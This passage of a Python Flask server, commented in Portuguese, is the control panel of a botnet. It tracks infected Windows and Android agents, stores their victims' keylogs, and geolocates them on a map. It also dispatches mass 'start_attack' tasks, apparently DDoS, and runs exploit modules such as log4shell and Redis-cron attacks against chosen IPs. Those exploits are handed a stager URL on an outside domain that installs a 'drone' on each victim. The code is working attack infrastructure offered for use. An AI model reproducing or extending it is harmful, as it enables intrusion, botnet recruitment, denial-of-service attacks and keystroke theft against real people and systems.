                "hostname":     row["hostname"],
                "username":     row["username"],
                "external_ip":  row["external_ip"],
                "agent_status": row["agent_status"],
                "command":      row["command"],
                "args":         row["args"],
                "data_type":    row["data_type"],
                "timestamp":    row["timestamp_issued"],
                "issued_by":    row["issued_by"],
                "preview":      preview,
            })

        return jsonify({"query": q, "total": len(results), "results": results}), 200

    except Exception as e:
        logger.error("[SEARCH] Erro na busca cross-agent: %s", e)
        return jsonify({"error": "Erro interno na busca."}), 500


@app.route('/get_task_mobile/<agent_id>', methods=['GET'])
@mobile_auth_required
def get_task_mobile(agent_id):
    """
    Endpoint de busca de tarefas SEM CRIPTOGRAFIA, para o agente Android.
    """
    # --- PARTE 1: ATUALIZAÇÃO DO AGENTE (last_seen) ---
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    agent_row = cursor.fetchone()

    if not agent_row:
        conn.close()
        # Se o agente não existe, retorna um erro claro
        return jsonify({"error": "Agente não registrado"}), 404

    # Atualiza o last_seen para manter o agente online
    cursor.execute(
        "UPDATE agents SET last_seen = ?, status = 'online' WHERE id = ?",
        (datetime.now().isoformat(), agent_id)
    )
    conn.commit()
    # A lógica de atualizar GEO pode ser mantida, mas vamos simplificar por agora

    # --- PARTE 2: BUSCA DE TAREFAS ---
    task_to_send = None
    try:
        cursor.execute(
            "SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY timestamp_issued ASC LIMIT 1",
            (agent_id,)
        )
        task_row = cursor.fetchone()

        if task_row:
            # Tarefa encontrada, marca como 'in_progress' com timestamp de inicio
            task_id = task_row['id']
            cursor.execute(
                "UPDATE tasks SET status = 'in_progress', timestamp_started = ? WHERE id = ?",
                (datetime.now().isoformat(), task_id)
            )
            conn.commit()
            
            # Tenta converter os argumentos para JSON se for o caso
            args_val = task_row['args']
            try:
                args_parsed = json.loads(args_val) if args_val and (args_val.startswith('{') or args_val.startswith('[')) else args_val
            except (json.JSONDecodeError, TypeError):
                args_parsed = args_val

            task_to_send = {"task_id": task_id, "command": task_row['command'], "args": args_parsed}
        else:
            # Nenhuma tarefa pendente, envia 'sleep'
            task_to_send = {"task_id": None, "command": "sleep", "args": "1"} # Usando 1 minuto
    except Exception as e:
        logger.error("Falha ao buscar tarefa para o agente mobile %s: %s", agent_id, e)
        task_to_send = {"task_id": None, "command": "sleep", "args": "5"}
    finally:
        conn.close()

    # --- PARTE 3: NOTIFICAÇÃO E RESPOSTA ---
    # Notifica o painel que o agente está online
    socketio.emit('agent_list_update', get_agents_with_status())
    
    # Retorna a tarefa como um JSON puro
    return jsonify(task_to_send)




@app.route('/task_result_mobile', methods=['POST'])
@mobile_auth_required
def post_result_mobile():
    """
    Endpoint que recebe resultados de tarefas SEM CRIPTOGRAFIA, para o agente Android.
    """
    try:
        # 1. Pega os dados diretamente do JSON, sem descriptografar
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON inválido ou vazio."}), 400

        # 2. Extrai as informações
        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        data_type = data.get('data_type', 'generic_result')
        result_data = data.get('result')

        if not task_id or not agent_id:
            return jsonify({"error": "agent_id ou task_id ausentes."}), 400

        conn = get_db_connection()
        cursor = conn.cursor()

        # 3. Atualiza a tarefa no banco de dados (state machine mobile)
        new_status_db = 'completed' if data_type != 'error' else 'failed'
        result_str = json.dumps(result_data) if isinstance(result_data, (dict, list)) else str(result_data)
        now_iso = datetime.now().isoformat()

        cursor.execute(
            "UPDATE tasks SET status = ?, result = ?, data_type = ?, updated_at = ? WHERE id = ?",
            (new_status_db, result_str, data_type, now_iso, task_id)
        )
        conn.commit()
        socketio.emit('task_status_update', {
            'task_id': task_id,
            'agent_id': agent_id,
            'status': new_status_db
        })
        
        # Loga o evento de conclusão
        cursor.execute("SELECT command FROM tasks WHERE id = ?", (task_id,))
        task_row = cursor.fetchone()
        command_name = task_row['command'] if task_row else "desconhecido"
        log_system_event(agent_id, new_status_db.upper(), f"Comando '{command_name}' finalizado.")

        conn.close()

        # 4. Notifica o painel sobre o novo resultado
        socketio.emit('new_result', {"agent_id": agent_id, "task_id": task_id, "data_type": data_type, "data": result_data})
        
        # Atualiza a lista de tarefas no painel
        conn_read = get_db_connection()
        tasks_from_db = conn_read.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,)).fetchall()
        conn_read.close()
        all_agent_tasks = [dict(row) for row in tasks_from_db]
        socketio.emit('tasks_update', {'agent_id': agent_id, 'tasks': all_agent_tasks})
        
        trigger_dashboard_update()

        # 5. Responde ao agente com sucesso
        return jsonify({"status": "success"})

    except Exception as e:
        logger.error("Falha no endpoint /task_result_mobile: %s", e)
        import traceback
        traceback.print_exc()
        return jsonify({"error": "Erro interno no servidor ao processar resultado."}), 500



@app.route('/get_tasks/<agent_id>', methods=['GET'])
@login_required
def get_tasks(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    agent_exists = cursor.fetchone()

    if not agent_exists:
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    # 2. Busca todas as tarefas para o agente_id especificado, ordenadas pela mais recente
    cursor.execute("SELECT * FROM tasks WHERE agent_id = ? ORDER BY timestamp_issued DESC", (agent_id,))
    tasks_rows = cursor.fetchall()
    conn.close()

    # 3. Converte as linhas do banco de dados em uma lista de dicionários
    #    A mesma estrutura que o painel espera.
    agent_tasks = [dict(row) for row in tasks_rows]
    
    return jsonify(agent_tasks)

@app.route('/get_system_logs/<agent_id>', methods=['GET'])
@login_required
def get_system_logs(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return "Agente não encontrado.", 404

    # 2. Busca todos os logs para o agente, ordenados do mais antigo para o mais recente
    cursor.execute("SELECT timestamp, event_type, message FROM system_logs WHERE agent_id = ? ORDER BY timestamp ASC", (agent_id,))
    log_rows = cursor.fetchall()
    conn.close()

    if not log_rows:
        return "Nenhum log de sistema para este agente.", 200 # Retorna 200 OK com uma mensagem

    # 3. Formata os logs para exibição, similar ao formato de arquivo antigo
    formatted_logs = []
    for row in log_rows:
        # Recria a string de log a partir dos dados do banco
        timestamp_dt = datetime.fromisoformat(row['timestamp'])
        formatted_timestamp = timestamp_dt.strftime('%Y-%m-%d %H:%M:%S')
        log_line = f"[{formatted_timestamp}] [{row['event_type']}] {row['message']}"
        formatted_logs.append(log_line)
    
    return "\n".join(formatted_logs), 200



@app.route('/get_history/<agent_id>', methods=['GET'])
@login_required
def get_history(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    # 2. Busca todas as tarefas CONCLUÍDAS ou com ERRO para o agente,
    #    que são as que constituem o histórico de resultados.
    #    Ordena pelas mais recentes primeiro.
    cursor.execute(
        "SELECT id, command, timestamp_issued, status, result, data_type FROM tasks WHERE agent_id = ? AND (status = 'completed' OR status = 'failed') ORDER BY timestamp_issued DESC",
        (agent_id,)
    )
    task_rows = cursor.fetchall()
    conn.close()

    history_results = []
    for row in task_rows:
        # Tenta decodificar o resultado de volta para um objeto Python, se for um JSON.
        try:
            result_data = json.loads(row['result']) if row['result'] and (row['result'].startswith('{') or row['result'].startswith('[')) else row['result']
        except (json.JSONDecodeError, TypeError):
            result_data = row['result'] # Se não for JSON, usa como texto.

        # Monta a estrutura de dicionário que o painel espera
        history_results.append({
            "task_id":   row['id'],
            "command":   row['command'],
            "timestamp": row['timestamp_issued'],
            "data_type": row['data_type'],
            "status":    row['status'],
            "data":      result_data,
            "agent_id":  agent_id
        })
        
    return jsonify(history_results)




@app.route('/api/geolocate/<ip_address>')
@login_required
def geolocate_ip(ip_address):
    """
    Endpoint proxy que agora utiliza a função interna 'resolve_geo',
    aproveitando o sistema de cache para economizar requisições de API.
    """
    # A mágica está aqui: reutilizamos a sua função com cache!
    geo_data = resolve_geo(ip_address)

    if geo_data:
        # A função resolve_geo já retorna um dicionário pronto (ou None)
        return jsonify(geo_data)
    else:
        # Se a função não encontrar nada (IP inválido, erro na API, etc.), retornamos um erro
        return jsonify({"error": "Não foi possível obter a geolocalização para o IP."}), 404


@app.route('/delete_agents', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def delete_agents():
    data = request.json
    agent_ids_to_delete = data.get('agent_ids', [])
    
    if not agent_ids_to_delete:
        return jsonify({"status": "noop", "message": "Nenhum ID de agente fornecido."})

    conn = get_db_connection()
    cursor = conn.cursor()
    ids_as_tuples = [(agent_id,) for agent_id in agent_ids_to_delete]

    # Remove registros órfãos ANTES de deletar o agente (evita FK violations futuras)
    cursor.executemany("DELETE FROM tasks        WHERE agent_id = ?", ids_as_tuples)
    cursor.executemany("DELETE FROM keylogs      WHERE agent_id = ?", ids_as_tuples)
    cursor.executemany("DELETE FROM system_logs  WHERE agent_id = ?", ids_as_tuples)
    cursor.executemany("DELETE FROM agents       WHERE id = ?",       ids_as_tuples)

    deleted_count = cursor.rowcount
    conn.commit()
    conn.close()

    # Remove arquivos de download do disco
    for agent_id in agent_ids_to_delete:
        agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
        if os.path.isdir(agent_download_dir):
            try:
                shutil.rmtree(agent_download_dir)
            except OSError as e:
                logger.error("Falha ao remover diretório de downloads para %s: %s", agent_id, e)
        agent_keylog_dir = os.path.join(KEYLOGS_DIR, agent_id)
        if os.path.isdir(agent_keylog_dir):
            try:
                shutil.rmtree(agent_keylog_dir)
            except OSError as e:
                logger.error("Falha ao remover diretório de keylogs para %s: %s", agent_id, e)

    log_operator_action("SYSTEM", "delete_selected", {"deleted_ids": agent_ids_to_delete})
    
    # Notifica o painel para atualizar a lista de agentes
    socketio.emit('agent_list_update', get_agents_with_status())
    
    return jsonify({"status": "success", "deleted_count": deleted_count})

@app.route('/get_keylogs/<agent_id>', methods=['GET'])
@login_required
def get_keylogs(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return "Agente não encontrado.", 404

    # 2. Busca todos os fragmentos de keylog para o agente, em ordem
    cursor.execute("SELECT log_data FROM keylogs WHERE agent_id = ? ORDER BY timestamp ASC", (agent_id,))
    log_rows = cursor.fetchall()
    conn.close()

    if not log_rows:
        return "Nenhum log capturado para este agente ainda.", 200 # Retorna 200 OK

    # 3. Concatena todos os fragmentos de log em uma única string
    full_log = "".join([row['log_data'] for row in log_rows])
    
    return full_log, 200


def get_agents_with_status():
    """
    Pega os agentes do banco de dados e adiciona o status 'online'/'offline'.
    """
    # Dicionário que será retornado, no mesmo formato que o painel espera.
    agents_with_status = {}
    
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Seleciona todos os agentes do banco de dados.
        cursor.execute("SELECT * FROM agents")
        all_agents_rows = cursor.fetchall()
        conn.close()

        now = datetime.now()
        
        for agent_row in all_agents_rows:
            # A 'row_factory' que definimos em get_db_connection nos permite
            # converter a linha do banco diretamente para um dicionário.
            agent_dict = dict(agent_row)
            
            # A lógica de cálculo de status permanece exatamente a mesma.
            last_seen_dt = datetime.fromisoformat(agent_dict['last_seen'])
            if (now - last_seen_dt) < timedelta(seconds=AGENT_TIMEOUT_SECONDS):
                agent_dict['status'] = 'online'
            else:
                agent_dict['status'] = 'offline'
            
            # Adiciona o dicionário do agente ao resultado final, usando o ID como chave.
            agents_with_status[agent_dict['id']] = agent_dict
            
    except Exception as e:
        logger.error("Falha ao buscar agentes do banco de dados: %s", e)
        # Retorna um dicionário vazio em caso de erro para não quebrar o painel.
        return {}
        
    return agents_with_status




def get_dashboard_data_logic():
    """
    Coleta dados para o dashboard, lendo diretamente do banco de dados SQLite.
    """
    # A função get_agents_with_status() já usa o DB, então podemos reutilizá-la.
    agents_with_status = get_agents_with_status()
    
    conn = get_db_connection()
    cursor = conn.cursor()

    # --- KPIs (Key Performance Indicators) ---
    total_agents = len(agents_with_status)
    online_agents = len([a for a in agents_with_status.values() if a['status'] == 'online'])

    # Busca o agente com o 'last_seen' mais recente diretamente do banco
    cursor.execute("SELECT hostname, last_seen FROM agents ORDER BY last_seen DESC LIMIT 1")
    latest_agent_row = cursor.fetchone()
    
    last_checkin = {'hostname': None, 'time': '1970-01-01T00:00:00.000000'}
    if latest_agent_row:
        last_checkin = {'hostname': latest_agent_row['hostname'], 'time': latest_agent_row['last_seen']}

    kpis = {
        'total_agents': total_agents,
        'online_agents': online_agents,
        'offline_agents': total_agents - online_agents,
        'last_checkin': last_checkin
    }

    # --- DADOS PARA GRÁFICOS ---
    now = datetime.now()
    activity_data = [0] * 24
    # Usa o dicionário já carregado pela get_agents_with_status
    for agent in agents_with_status.values():
        last_seen = datetime.fromisoformat(agent['last_seen'])
        if now - last_seen < timedelta(hours=24):
            hour_diff = (now - last_seen).seconds // 3600
            activity_data[23 - hour_diff] += 1
    activity_labels = [(now - timedelta(hours=i)).strftime('%H:00') for i in range(23, -1, -1)]

    # Gráficos de Pizza (SO e Privilégios) - Usa o mesmo dicionário
    os_counts = Counter(a.get('os_name', 'Desconhecido').split(' ')[0] for a in agents_with_status.values())
    priv_counts = Counter(a.get('privileges', 'Desconhecido') for a in agents_with_status.values())

    # Gráfico de Comandos Mais Usados - Busca no banco de dados
    cursor.execute("SELECT command, COUNT(command) as count FROM tasks GROUP BY command ORDER BY count DESC LIMIT 5")
    top_commands_rows = cursor.fetchall()
    top_commands = {'labels': [row['command'] for row in top_commands_rows], 'data': [row['count'] for row in top_commands_rows]}

    charts_data = {
        'activity': {'labels': activity_labels, 'data': activity_data},
        'os_distribution': {'labels': list(os_counts.keys()), 'data': list(os_counts.values())},
        'privileges_distribution': {'labels': list(priv_counts.keys()), 'data': list(priv_counts.values())},
        'top_commands': top_commands
    }

    # --- DADOS DO MAPA ---
    map_data = []
    for agent_id, agent_data in agents_with_status.items():
        agent_info = {
            'id': agent_id,
            'hostname': agent_data.get('hostname'),
            'ip': agent_data.get('external_ip') or agent_data.get('internal_ip'),
            'os': agent_data.get('os_name'),
            'status': agent_data.get('status'),
            'lat': agent_data.get('geo_latitude'),
            'lon': agent_data.get('geo_longitude'),
            'city': agent_data.get('geo_city'),
            'country': agent_data.get('geo_country')
        }
        # Agentes sem geolocalização ficam com lat/lon = None e não são plotados no mapa
        map_data.append(agent_info)

    # --- AGENTES RECENTES E FEED DE ATIVIDADE ---
    # Busca os 5 agentes mais recentes no banco
    cursor.execute("SELECT hostname, username, last_seen FROM agents ORDER BY last_seen DESC LIMIT 5")
    recent_agents_data = [dict(row) for row in cursor.fetchall()]

    # Busca as 7 tarefas mais recentes no banco
    cursor.execute("SELECT command, timestamp_issued, status FROM tasks ORDER BY timestamp_issued DESC LIMIT 7")
    activity_feed_data = [dict(row) for row in cursor.fetchall()]
    
    conn.close()

    return {
        'kpis': kpis,
        'charts': charts_data,
        'map_data': map_data,
        'recent_agents': recent_agents_data,
        'activity_feed': activity_feed_data
    }

def add_task_to_db(agent_id, command, args, issued_by=None):
    """
    Função auxiliar para adicionar uma tarefa ao banco de dados.
    issued_by: quem emitiu a task (usuario logado, 'scheduler', 'telegram_bot', etc.)
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    task_id = str(uuid.uuid4())
    task_data = {
        "id": task_id,
        "agent_id": agent_id,
        "command": command,
        "args": json.dumps(args) if isinstance(args, (dict, list)) else (args or ''),
        "status": "pending",
        "timestamp_issued": datetime.now().isoformat(),
        "result": None,
        "data_type": None,
        "issued_by": issued_by or 'system',
    }
    cursor.execute(
        """
        INSERT INTO tasks (id, agent_id, command, args, status, timestamp_issued, result, data_type, issued_by)
        VALUES (:id, :agent_id, :command, :args, :status, :timestamp_issued, :result, :data_type, :issued_by)
        """,
        task_data
    )
    conn.commit()
    conn.close()
    return task_id


@app.route('/launch_mass_attack', methods=['POST'])
@login_required
@role_required(['Administrator'])
def launch_mass_attack():
    """
    Recebe uma lista de AGENTES SELECIONADOS e parâmetros de ataque,
    e cria uma tarefa individual para CADA agente.
    """
    try:
        data = request.json
        
        # 1. Extrai os dados da requisição
        agent_ids_to_task = data.get('agent_ids', [])
        
        if not agent_ids_to_task:
            return jsonify({"status": "error", "message": "Nenhum agente foi selecionado."}), 400

        # 2. Monta o dicionário de argumentos para a tarefa
        task_args = {
            "method": data.get('method'),
            "target": data.get('target'),
            "port": data.get('port'),
            "duration": data.get('duration'),
            "threads": data.get('threads')
        }
        
        # 3. Itera sobre cada AGENT_ID selecionado e cria uma tarefa específica para ele
        tasks_created_count = 0
        for agent_id in agent_ids_to_task:
            # A função do agente é 'start_attack', e os argumentos são o JSON que montamos
            # A função add_task_to_db que você já tem é chamada aqui
            add_task_to_db(agent_id, "start_attack", task_args)
            tasks_created_count += 1
            
        logger.info("Ataque Direcionado despachado: %d tarefas criadas para o comando '%s'", tasks_created_count, task_args['method'])

        return jsonify({
            "status": "success",
            "message": f"Comando de ataque '{task_args['method']}' enviado para {tasks_created_count} agente(s) selecionado(s)."
        })

    except Exception as e:
        logger.error("Falha ao despachar ataque direcionado: %s", e)
        return jsonify({"status": "error", "message": "Erro interno do servidor ao processar o ataque."}), 500


@app.route('/exploits/<path:filename>')
@hmac_required # Protege para que apenas você possa ver/listar os exploits
def download_exploit(filename):
    """
    Rota segura para servir scripts de exploit da pasta 'exploits'.
    """
    exploits_dir = os.path.join(app.root_path, 'exploits')
    return send_from_directory(exploits_dir, filename)


@app.route('/api/get_vuln_map', methods=['GET'])
@hmac_required
def get_vuln_map():
    """
    Endpoint para o agente obter o dicionário de vulnerabilidades.
    """
    return jsonify(VULN_MAP)

@app.route('/launch_scan_and_exploit', methods=['POST'])
@login_required
@role_required(['Administrator'])
def launch_scan_and_exploit():
    """
    Recebe uma lista de alvos do painel e cria uma única tarefa 
    'scan_and_exploit' para um agente selecionado.
    """
    data = request.json
    agent_id = data.get('agent_id')
    targets_str = data.get('targets', '') # Recebe como uma string de IPs separados por vírgula/espaço
    
    if not agent_id or not targets_str:
        return jsonify({"status": "error", "message": "ID do agente e lista de alvos são necessários."}), 400

    # Converte a string de alvos em uma lista limpa de IPs
    target_list = [ip.strip() for ip in re.split(r'[,\s\n]+', targets_str) if ip.strip()]

    if not target_list:
        return jsonify({"status": "error", "message": "Nenhum alvo válido fornecido."}), 400

    # Cria a tarefa para o agente selecionado
    task_args = {"targets": target_list}
    add_task_to_db(agent_id, "scan_and_exploit", task_args)
    
    return jsonify({"status": "success", "message": f"Tarefa de varredura e exploração enviada para o agente {agent_id} com {len(target_list)} alvos."})


def _parse_exploit_meta(filepath: Path) -> dict:
    """Extrai metadados dos comentários do topo do script."""
    meta = {
        "filename":    filepath.name,
        "name":        filepath.stem,
        "cve":         None,
        "description": None,
        "default_port": None,
    }
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line.startswith('#'):
                    if line: break
                    continue
                if 'CVE:'          in line: meta['cve']          = line.split('CVE:')[1].strip()
                elif 'Description:' in line: meta['description']  = line.split('Description:')[1].strip()
                elif 'Default-Port:' in line: meta['default_port'] = line.split('Default-Port:')[1].strip()
    except Exception:
        pass
    return meta
 
 
def _parse_ports(ports_input: list) -> list:
    """
    Converte a lista de portas recebida do frontend (já processada pelo JS)
    em uma lista de inteiros. Aceita também ranges como strings '8080-8090'.
    """
    if not ports_input:
        return []
    result = set()
    for item in ports_input:
        if isinstance(item, int):
            result.add(item)
        elif isinstance(item, str) and '-' in item:
            try:
                a, b = map(int, item.split('-'))
                result.update(range(a, b + 1))
            except Exception:
                pass
        else:
            try:
                result.add(int(item))
            except Exception:
                pass
    return sorted(list(result))
 
 
def _load_exploit_module(exploit_path: Path):
    """Carrega e retorna o módulo Python do exploit."""
    spec   = importlib.util.spec_from_file_location(exploit_path.stem, exploit_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module
 
 
def _get_stager_script(c2_base_url: str) -> str:
    """Gera um stager_script mínimo com a URL do C2 para os exploits que precisam instalar drone."""
    return f'C2_URL="{c2_base_url}"\n'
 
 
# ==============================================================================
# ROTAS
# ==============================================================================
 
@app.route('/exploits')
@login_required
@role_required(['Administrator'])
def exploits_page():
    return render_template('exploits.html')
 
 
@app.route('/api/exploits/list', methods=['GET'])
@login_required
@role_required(['Administrator'])
def list_exploits():
    try:
        EXPLOITS_DIR.mkdir(exist_ok=True)
        exploits = [_parse_exploit_meta(f) for f in sorted(EXPLOITS_DIR.glob('*.py'))]
        return jsonify({"exploits": exploits})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
 
 
@app.route('/api/exploits/run', methods=['POST'])
@login_required
@role_required(['Administrator'])
def run_exploits_server():
    """
    Executa um ou mais exploits em uma ou mais portas contra um alvo.
 
    Body JSON:
        exploits:  lista de nomes de arquivo (ex: ["log4shell.py", "redis_unauth_cron.py"])
        target_ip: IP do alvo
        ports:     lista de portas (ex: [6379, 8080]) - vazio usa default de cada exploit
        mode:      "sequential" | "parallel"
        run_id:    ID único da execução
    """
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "Body inválido."}), 400
 
    exploit_names = data.get('exploits', [])
    target_ip     = data.get('target_ip')
    ports_raw     = data.get('ports', [])
    mode          = data.get('mode', 'sequential')
    run_id        = data.get('run_id', f"run-{uuid.uuid4()}")
 
    if not exploit_names:
        return jsonify({"status": "error", "message": "Nenhum exploit selecionado."}), 400
    if not target_ip:
        return jsonify({"status": "error", "message": "target_ip é obrigatório."}), 400
 
    # Sanitiza e valida os nomes
    exploit_names = [os.path.basename(n) for n in exploit_names]
    for name in exploit_names:
        if not (EXPLOITS_DIR / name).exists():
            return jsonify({"status": "error", "message": f"Exploit '{name}' não encontrado."}), 404
 
    ports = _parse_ports(ports_raw)
 
    log_operator_action(
        session.get('username', 'unknown'),
        'run_exploit_server',
        f"{', '.join(exploit_names)} → {target_ip}"
    )
 
    thread = threading.Thread(
        target=_execute_jobs_thread,
        args=(exploit_names, target_ip, ports, mode, run_id),
        daemon=True
    )
    thread.start()
 
    return jsonify({"status": "started", "run_id": run_id})
 
 
# ==============================================================================
# EXECUÇÃO DOS JOBS
# ==============================================================================
 
def _build_jobs(exploit_names: list, ports: list) -> list:
    """
    Constrói a lista de jobs (exploit, porta).
    Se ports estiver vazio, usa a porta default de cada exploit (ou None).
    """
    jobs = []
    for name in exploit_names:
        meta         = _parse_exploit_meta(EXPLOITS_DIR / name)
        default_port = meta.get('default_port')
        job_ports    = ports if ports else ([int(default_port)] if default_port else [None])
        for port in job_ports:
            jobs.append({"exploit": name, "port": port})
    return jobs
 
 
def _execute_single_job(job: dict, target_ip: str, run_id: str, stager_script: str):
    """Executa um único job (exploit + porta) e emite eventos via WebSocket."""
    exploit_name = job['exploit']
    port         = job['port']
    exploit_path = EXPLOITS_DIR / exploit_name
    status       = 'failed'
 
    def log_fn(message: str):
        msg_lower = message.lower()
        if any(k in msg_lower for k in ['erro','error','falha','failed','✗']):
            level = 'error'
        elif any(k in msg_lower for k in ['sucesso','success','✓','comprometido','ok']):
            level = 'success'
        elif any(k in msg_lower for k in ['passo','etapa','[passo','step']):
            level = 'step'
        elif any(k in msg_lower for k in ['vuln','cve','exploit','jndi','redis']):
            level = 'vuln'
        elif any(k in msg_lower for k in ['aviso','warn']):
            level = 'warn'
        else:
            level = 'info'
        socketio.emit('exploit_log', {'run_id': run_id, 'message': message, 'level': level})
 
    try:
        log_fn(f"[JOB] {exploit_name} → {target_ip}:{port or 'default'}")
        module = _load_exploit_module(exploit_path)
 
        if not hasattr(module, 'run') or not callable(module.run):
            raise RuntimeError(f"'{exploit_name}' não define função run().")
 
        # Sobrescreve a porta default se fornecida
        if port and hasattr(module, 'TARGET_PORT'):
            module.TARGET_PORT = int(port)
 
        module.run(
            target_ip    = target_ip,
            payload_url  = stager_script,
            log_function = log_fn
        )
        status = 'success'
 
    except Exception as e:
        import traceback
        log_fn(f"[JOB] Erro: {e}")
        log_fn(traceback.format_exc())
 
    # Emite evento de conclusão do job individual
    socketio.emit('exploit_job_done', {
        'run_id':  run_id,
        'exploit': exploit_name,
        'port':    port,
        'status':  status
    })
    return status
 
 
def _execute_jobs_thread(exploit_names: list, target_ip: str,
                         ports: list, mode: str, run_id: str):
    """Thread principal que orquestra todos os jobs."""
    jobs         = _build_jobs(exploit_names, ports)
    total        = len(jobs)
    success_count = 0
 
    c2_base     = os.environ.get('C2_STAGER_BASE_URL', '').rstrip('/') \
                  or os.environ.get('C2_BASE_URL', 'https://panelwhxami.shop').rstrip('/')
    stager_script = f"{c2_base}/stager/drone.sh"
 
    socketio.emit('exploit_log', {
        'run_id':  run_id,
        'message': f"[SERVIDOR] {total} job(s) a executar - modo {mode}",
        'level':   'step'
    })
 
    if mode == 'parallel':
        # ── Modo paralelo: todos os jobs em threads simultâneas ──────────────
        results    = [None] * total
        threads    = []
 
        def run_job(idx, job):
            results[idx] = _execute_single_job(job, target_ip, run_id, stager_script)
 
        for i, job in enumerate(jobs):
            t = threading.Thread(target=run_job, args=(i, job), daemon=True)
            threads.append(t)
            t.start()
 
        for t in threads:
            t.join()
 
        success_count = sum(1 for r in results if r == 'success')
 
    else:
        # ── Modo sequencial: um job de cada vez ──────────────────────────────
        for job in jobs:
            result = _execute_single_job(job, target_ip, run_id, stager_script)
            if result == 'success':
                success_count += 1
 
    # Emite evento de conclusão geral
    socketio.emit('exploit_finished', {
        'run_id':        run_id,
        'total_jobs':    total,
        'success_count': success_count,
        'status':        'success' if success_count > 0 else 'failed'
    })



#NMAP ROUTES AND FUNCTIONS

def _parse_nmap_output(output: str) -> list:
    """
    Extrai portas abertas do output texto do nmap.
    Retorna lista de dicts: {port, protocol, state, service, version}
    """
    ports = []
 
    # Regex para linhas de porta:
    # Ex: "80/tcp   open  http    Apache httpd 2.4.41"
    # Ex: "6379/tcp open  redis   Redis key-value store 6.2"
    pattern = re.compile(
        r'^(\d+)/(tcp|udp)\s+'       # porta/protocolo
        r'(open|closed|filtered)\s+' # estado
        r'(\S+)'                      # serviço
        r'(?:\s+(.+))?$',             # versão (opcional)
        re.MULTILINE
    )
 
    for match in pattern.finditer(output):
        port, proto, state, service, version = match.groups()
        ports.append({
            "port":     port,
            "protocol": proto,
            "state":    state,
            "service":  service or "",
            "version":  (version or "").strip(),
        })
 
    return ports
 
 
def _sanitize_nmap_args(args: str) -> list:
    """
    Converte a string de argumentos em lista segura para subprocess.
    Remove flags perigosas que poderiam ser usadas para injeção de comando.
    """
    BLOCKED = {'--script-args', '-oN', '-oX', '-oG', '-oA', '--resume', '-iL', '-iR'}
 
    try:
        parts = shlex.split(args)
    except ValueError:
        parts = args.split()
 
    safe = []
    skip_next = False
    for part in parts:
        if skip_next:
            skip_next = False
            continue
        # Bloqueia flags de output para arquivo e input de arquivo
        if any(part.startswith(b) for b in BLOCKED):
            skip_next = '=' not in part
            continue
        safe.append(part)
 
    return safe
 
 
# ── ROTA ──────────────────────────────────────────────────────────────────────
 
@app.route('/api/nmap/scan', methods=['POST'])
@login_required
@role_required(['Administrator'])
def nmap_scan():
    """
    Executa nmap e emite o output linha por linha via WebSocket em tempo real.
 
    Body JSON:
        target:  IP ou hostname alvo
        args:    argumentos nmap (ex: "-sV -O --open")
        scan_id: ID único do scan (gerado pelo frontend)
    """
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "Body inválido."}), 400
 
    target  = data.get('target', '').strip()
    args    = data.get('args', '-sV --open').strip()
    scan_id = data.get('scan_id', f"scan-{uuid.uuid4()}")
 
    if not target:
        return jsonify({"status": "error", "message": "target é obrigatório."}), 400
 
    # Verifica se nmap está instalado
    if not shutil.which('nmap'):
        return jsonify({
            "status": "error",
            "message": "nmap não encontrado. Instale com: sudo apt-get install nmap"
        }), 500
 
    log_operator_action(
        session.get('username', 'unknown'),
        'nmap_scan',
        f"nmap {args} {target}"
    )
 
    socketio.start_background_task(
        _run_nmap_thread,
        target, args, scan_id
    )
 
    return jsonify({"status": "started", "scan_id": scan_id})
 
 
def _run_nmap_thread(target: str, args_str: str, scan_id: str):
    """
    Executa o nmap em background e emite cada linha via WebSocket.
    """
    import time as _time
 
    safe_args = _sanitize_nmap_args(args_str)
    command   = ['nmap'] + safe_args + [target]
 
    socketio.emit('nmap_output', {
        'scan_id': scan_id,
        'line':    f"[NMAP] Executando: {' '.join(command)}"
    })
 
    full_output = []
    start_time  = _time.time()
 
    try:
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding='utf-8',
            errors='ignore'
        )
 
        for line in proc.stdout:
            line = line.rstrip()
            if not line:
                continue
            full_output.append(line)
            socketio.emit('nmap_output', {
                'scan_id': scan_id,
                'line':    line
            })
 
        proc.wait()
        duration = f"{round(_time.time() - start_time, 1)}s"
 
        # Parseia as portas do output completo
        ports = _parse_nmap_output('\n'.join(full_output))
 
        socketio.emit('nmap_output', {
            'scan_id': scan_id,
            'line':    f"[NMAP] Scan concluído em {duration} - {len(ports)} porta(s) detectada(s)."
        })
 
        socketio.emit('nmap_finished', {
            'scan_id':  scan_id,
            'target':   target,
            'args':     args_str,
            'ports':    ports,
            'duration': duration,
            'status':   'success' if ports else 'no_results'
        })
 
    except Exception as e:
